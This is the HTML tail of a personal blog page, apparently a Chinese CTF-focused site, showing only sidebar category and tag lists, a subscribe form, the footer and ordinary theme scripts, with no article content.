is-marginless" href="/categories/WEB/"><span class="level-start"><span class="level-item">WEB</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"><span class="level-start"><span class="level-item">å­¦ä¹ æŠ¥å‘Š</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">ç¬”è®°</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">ä¹æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">å…«æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/05/"><span class="level-start"><span class="level-item">äº”æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/04/"><span class="level-start"><span class="level-item">å››æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/03/"><span class="level-start"><span class="level-item">ä¸‰æœˆ 2021</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><a class="level is-mobile is-marginless" href="/archives/"><span class="level-start"><span class="level-item">æŸ¥çœ‹å…¨éƒ¨&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">æ ‡ç­¾</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/buuctf/"><span class="tag">buuctf</span><span class="tag is-grey-lightest">16</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf/"><span class="tag">Buuctf</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"><span class="tag">phpå˜é‡è¦†ç›–</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><span class="tag">ä¼ªåè®®</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">Buuctf PHPä»£ç å®¡è®¡ æ–‡ä»¶åŒ…å«</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Buuctf-SQL/"><span class="tag">Buuctf SQL</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Html%E5%92%8Ccss/"><span class="tag">Htmlå’Œcss</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">è®¢é˜…æ›´æ–°</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="è®¢é˜…"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/inanb.png" alt="inanb" height="28"></a><p class="size-small"><span>&copy; 2021 inanb</span>Â Â Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a>Â <br><span>Â© ç‰ˆæƒè¯´æ˜ï¼š[æœ¬ç½‘ç«™æ‰€æœ‰å†…å®¹å‡æ”¶é›†äºäº’è”ç½‘æˆ–è‡ªå·±åˆ›ä½œ,<br />&nbsp;&nbsp;&nbsp;&nbsp;æ–¹ä¾¿äºç½‘å‹ä¸è‡ªå·±å­¦ä¹ äº¤æµï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·<a href="/message" target="_blank">ç•™è¨€</a>ï¼Œç«‹å³å¤„ç†]<br /></span><div class="size-small"><span>â¤ï¸æ„Ÿè°¢ <strong><span id="busuanzi_value_site_uv">99+</span></strong> å°ä¼™ä¼´çš„ <strong><span id="busuanzi_value_site_pv">99+</span></strong> æ¬¡å…‰ä¸´ï¼â¤ï¸</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/removeif/hexo-theme-amazing"><i class="fab fa-github"></i></a></p></div><div class="sideMusic"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><meting-js style="width: auto;height: 2000px;" server="netease" type="playlist" id="2165337463" theme="#2980b9" loop="all" autoplay="false" order="list" storageName="aplayer-setting" lrctype="0" list-max-height="400px" fixed="true"></meting-js></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
            elements: "a",//ä»£è¡¨ç‚¹å‡»é“¾æ¥å°±æ›´æ–°
            selectors: [  //ä»£è¡¨è¦æ›´æ–°çš„èŠ‚ç‚¹
                ".section",
                "title"
            ],
            cache: true,
            cacheBust:false
        })

        function loadBusuanzi(){
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
        }

        function loadMathJax() { //åŠ è½½mathjax
            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\(', '\)']] } });
                var math = document.getElementsByClassName("entry-content")[0];
                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
            });
        };

        // å¼€å§‹ PJAX æ‰§è¡Œçš„å‡½æ•°
        document.addEventListener('pjax:send', function () {
        });
        
        // PJAX å®Œæˆä¹‹åæ‰§è¡Œçš„å‡½æ•°ï¼Œå¯ä»¥å’Œä¸Šé¢çš„é‡è½½æ”¾åœ¨ä¸€èµ·
        document.addEventListener('pjax:complete', function () {
            $(".section").css({opacity:1});
            if(false){
                $.getScript('/js/comment-issue-data.js',function(){loadIssueData('undefined','undefined','undefined','undefined',undefined);});
            }
            if(false){
                loadMathJax();
            }
            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
            loadBackTop();
            loadBusuanzi();
            if(typeof loadBanner == 'function'){
                loadBanner();
            }
        });</script></body></html>